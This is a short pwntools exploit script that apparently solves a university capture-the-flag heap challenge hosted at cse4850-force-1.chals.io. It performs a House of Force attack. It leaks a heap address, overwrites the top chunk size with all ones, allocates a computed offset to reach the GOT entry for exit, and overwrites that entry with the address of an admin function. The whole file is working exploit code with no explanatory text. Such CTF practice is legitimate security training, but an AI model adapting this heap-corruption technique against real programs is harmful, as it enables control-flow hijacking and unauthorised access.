from pwn import *

binary = "./chal.bin_patched"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break login
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-force-1.chals.io", 443, ssl=True, sni="cse4850-force-1.chals.io")
    return process(e.path)

p = start()

p.recvuntil(b'memory at 0x')
heap_leak = int(p.recvlineS().strip(), 16)
heap_start = heap_leak + 0x250
log.info(f"Heap starts at {hex(heap_start)}")

chain = b'A'*0x88
chain += p64(0xffffffffffffffff)
p.sendlineafter(b'>>>', chain)

top_chunk = heap_start + 0x90
log.info(f"Current top chunk at {hex(top_chunk)}")
offset = e.got['exit'] - top_chunk - 0x20
log.info(f"Mallocing offset of {offset}")
p.sendlineafter(b'>>>', str(offset).encode('utf-8'))

p.sendlineafter(b'complaint >>>', p64(e.symbols['admin']))

p.interactive()